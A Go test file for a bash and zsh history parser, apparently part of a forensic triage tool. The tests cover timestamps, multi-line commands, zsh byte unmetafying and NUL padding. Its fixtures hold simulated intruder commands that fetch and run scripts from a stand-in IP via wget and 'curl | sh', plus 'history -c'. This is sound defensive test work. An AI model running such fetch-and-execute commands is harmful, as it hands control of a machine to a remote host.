package history

import (
	"context"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/ciruzz00/astro/internal/logs"
)

var mtime = time.Date(2026, 10, 12, 8, 0, 0, 0, time.UTC)

func parse(t *testing.T, kind logs.Kind, in, path string) ([]*logs.Event, logs.Stats) {
	t.Helper()
	var out []*logs.Event
	st, err := New(kind).Parse(context.Background(), strings.NewReader(in), logs.Options{Path: path, Source: ".history", ModTime: mtime},
		func(e *logs.Event) error { out = append(out, e); return nil })
	if err != nil {
		t.Fatal(err)
	}
	return out, st
}

func TestBashPlain(t *testing.T) {
	evs, st := parse(t, logs.KindBashHistory, "id\n\nwget http://198.51.100.7/x.sh -O /tmp/x.sh\nchmod +x /tmp/x.sh\n", "/home/alice/.bash_history")
	if st.Events != 3 || len(evs) != 3 {
		t.Fatalf("events = %d", len(evs))
	}
	for _, e := range evs {
		if !e.TimeUnknown || !e.Time.Equal(mtime) || e.User != "alice" || e.Process != "bash" || e.Kind != KindCommand {
			t.Errorf("event = %+v", e)
		}
	}
	if evs[1].CommandLine != "wget http://198.51.100.7/x.sh -O /tmp/x.sh" || evs[1].Ref.Record != "line 3" {
		t.Errorf("second = %+v", evs[1])
	}
}

func TestBashTimestamps(t *testing.T) {
	in := "ls\n#1760216400\nwhoami\n#1760216460\nfor i in 1 2; do\n  echo $i\ndone\n#1760216520\n#1760216580\nhistory -c\n"
	evs, _ := parse(t, logs.KindBashHistory, in, "/root/.bash_history")
	if len(evs) != 4 {
		t.Fatalf("events = %d: %+v", len(evs), evs)
	}
	if !evs[0].TimeUnknown || evs[0].CommandLine != "ls" {
		t.Errorf("before first timestamp = %+v", evs[0])
	}
	if evs[1].TimeUnknown || !evs[1].Time.Equal(time.Unix(1760216400, 0)) || evs[1].CommandLine != "whoami" || evs[1].User != "root" || evs[1].Ref.Record != "line 3" {
		t.Errorf("timed = %+v", evs[1])
	}
	if evs[2].CommandLine != "for i in 1 2; do\n  echo $i\ndone" {
		t.Errorf("multi-line = %q", evs[2].CommandLine)
	}
	if evs[3].CommandLine != "history -c" || !evs[3].Time.Equal(time.Unix(1760216580, 0)) {
		t.Errorf("empty timestamp skipped wrongly: %+v", evs[3])
	}
}

func TestZsh(t *testing.T) {
	in := ": 1760216400:0;cd /tmp\n" +
		": 1760216410:3;curl -fsSL http://198.51.100.7/a \\\n| sh\n" +
		"plain command\n" +
		": 1760216420:0;echo caf\x83\xc9\n" // a lone Latin-1 byte after unmetafy: must still be valid UTF-8
	evs, _ := parse(t, logs.KindZshHistory, in, `C:\triage\Users\bob\.zsh_history`)
	if len(evs) != 4 {
		t.Fatalf("events = %d: %+v", len(evs), evs)
	}
	if evs[0].CommandLine != "cd /tmp" || evs[0].Fields["duration_s"] != "0" || evs[0].User != "bob" || evs[0].Process != "zsh" {
		t.Errorf("first = %+v", evs[0])
	}
	if evs[1].CommandLine != "curl -fsSL http://198.51.100.7/a \n| sh" || evs[1].Fields["duration_s"] != "3" {
		t.Errorf("continued = %q", evs[1].CommandLine)
	}
	if !evs[2].TimeUnknown || !evs[2].Time.Equal(time.Unix(1760216410, 0)) {
		t.Errorf("plain line time = %+v", evs[2])
	}
	if !utf8.ValidString(evs[3].CommandLine) {
		t.Errorf("unmetafied = %q", evs[3].CommandLine)
	}
}

func TestNULInHistory(t *testing.T) {
	evs, _ := parse(t, logs.KindBashHistory, "id\n\x00\x00\x00whoami\n", "/root/.bash_history")
	if len(evs) != 3 || evs[1].Kind != logs.KindNULPadding || evs[1].Fields["nul_bytes"] != "3" || evs[2].CommandLine != "whoami" {
		t.Errorf("events = %+v", evs)
	}
}

func TestUnmetafy(t *testing.T) {
	// zsh stores 0xa9 (second byte of "é") as 0x83 0x89.
	if got := string(unmetafy([]byte{'c', 'a', 'f', 0xc3, 0x83, 0x89})); got != "café" {
		t.Errorf("unmetafy = %q", got)
	}
}

func TestUserFromPath(t *testing.T) {
	for path, want := range map[string]string{
		"/home/alice/.bash_history": "alice", "/root/.zsh_history": "root", `C:\x\Users\bob\.zsh_history`: "bob",
		"/evidence/.bash_history": "", ".bash_history": "", "": "",
	} {
		if got := userFromPath(path); got != want {
			t.Errorf("userFromPath(%q) = %q, want %q", path, got, want)
		}
	}
}

func FuzzParse(f *testing.F) {
	f.Add("ls\n#1760216400\nwhoami\n", false)
	f.Add(": 1760216400:0;a \\\nb\n", true)
	f.Fuzz(func(t *testing.T, in string, zsh bool) {
		kind := logs.KindBashHistory
		if zsh {
			kind = logs.KindZshHistory
		}
		_, err := New(kind).Parse(context.Background(), strings.NewReader(in), logs.Options{ModTime: mtime}, func(e *logs.Event) error {
			if e.Time.IsZero() || !utf8.ValidString(e.CommandLine) || len(e.CommandLine) > MaxCommand {
				t.Fatalf("bad event %+v", e)
			}
			return nil
		})
		if err != nil {
			t.Fatal(err)
		}
	})
}
